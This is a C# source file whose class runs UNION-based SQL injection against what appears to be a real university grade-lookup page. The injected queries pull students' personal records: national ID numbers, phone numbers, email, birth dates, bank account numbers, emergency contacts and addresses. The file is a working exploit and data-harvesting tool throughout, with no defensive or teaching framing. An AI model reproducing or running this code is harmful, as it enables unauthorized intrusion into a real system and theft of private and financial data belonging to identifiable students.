using System;
using System.Collections.Generic;
using System.Net;
using System.Text;

namespace WinFormsApp1
{
    class SinhVien
    {
        //varchar
        public string maSinhVien; 
        public string CMND;
        public string DIEN_THOAI_DD;
        public string DIEN_THOAI_GDINH; 
        public string EMAIL;
        public string KHICAN_BANTINCHO_AI;
        public string KHICAN_BANTINCHO_AI_DIACHI;
        public string SO_TAIKHOAN;
        public string NGAY_SINH;
        //nvarchar
        public string HODEM;
        public string TEN;
        public string PHUONG_XA;

        public bool kiemTraThongTin()
        {
            WebClient web1 = new WebClient();
            string url = "http://xemdiem.utc2.edu.vn/svxemdiem.aspx?ID=m2khustlerht%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CMND,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20TMS.DT_HOSO_SINHVIEN%20WHERE%20MA_SINHVIEN=%27"+this.maSinhVien+"%27%20--";
            string data = web1.DownloadString(url);
            if (data.IndexOf(@": <FONT  color='blue' face=""Times New Roman"" size=2> <STRONG>") != -1)// kiem tra ma sinh vien co ton tai hay khong
            {
                this.CMND = KetQuaCrawlVARCHAR2("CMND");
                this.DIEN_THOAI_DD = KetQuaCrawlVARCHAR2("DIEN_THOAI_DD");
                this.DIEN_THOAI_GDINH = KetQuaCrawlVARCHAR2("DIEN_THOAI_GDINH");
                this.EMAIL = KetQuaCrawlVARCHAR2("EMAIL");
                this.KHICAN_BANTINCHO_AI = KetQuaCrawlVARCHAR2("KHICAN_BANTINCHO_AI");
                this.NGAY_SINH = KetQuaCrawlVARCHAR2("NGAY_SINH");
                this.KHICAN_BANTINCHO_AI_DIACHI = KetQuaCrawlVARCHAR2("KHICAN_BANTINCHO_AI_DIACHI");
                this.SO_TAIKHOAN = KetQuaCrawlVARCHAR2("SO_TAIKHOAN");
                this.HODEM = KetQuaCrawlNVARCHAR2("HODEM");
                this.TEN = KetQuaCrawlNVARCHAR2("TEN");
                this.PHUONG_XA = KetQuaCrawlNVARCHAR2("PHUONG_XA");

            }
            else return false;
            return true;
          
        }
       private string KetQuaCrawlVARCHAR2(string thuocTinh) // cao cac thuoc tinh theo varchar
        {

            WebClient web1 = new WebClient();
            string url = "http://xemdiem.utc2.edu.vn/svxemdiem.aspx?ID=m2khustlerht%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,"+thuocTinh+",NULL,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20TMS.DT_HOSO_SINHVIEN%20WHERE%20MA_SINHVIEN=%27" + this.maSinhVien + "%27%20--";
            string data = web1.DownloadString(url);
          
                int dau = data.IndexOf(@": <FONT  color='blue' face=""Times New Roman"" size=2> <STRONG>");
                int cuoi = data.IndexOf(@"</STRONG></FONT>		</td></tr> <tr>");
            return data.Substring(dau + 61, cuoi - dau - 61); 
        }
        private string KetQuaCrawlNVARCHAR2(string thuocTinh) // cao cac thuoc tinh theo varchar
        {

            WebClient web1 = new WebClient();
            string url = "http://xemdiem.utc2.edu.vn/svxemdiem.aspx?ID=m2khustlerht%27%20UNION%20ALL%20SELECT%20NULL,NULL,"+thuocTinh+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20TMS.DT_HOSO_SINHVIEN%20WHERE%20MA_SINHVIEN=%27" + this.maSinhVien + "%27%20--";
            string data = web1.DownloadString(url);
            int dau = data.IndexOf(@"Tại: <FONT  color='blue' face=""Times New Roman"" size=2> <STRONG>");
            int cuoi = data.IndexOf(@"</STRONG></FONT>		</td></tr> <tr> 		<td nowrap colspan=2>			<FONT  color='blue' face=""Times New Roman"" size=2><STRONG></STRONG></FONT>		</td>		<td>			Hệ đào tạo:");
            return data.Substring(dau + 64, cuoi - dau - 64);

        }
    }
}
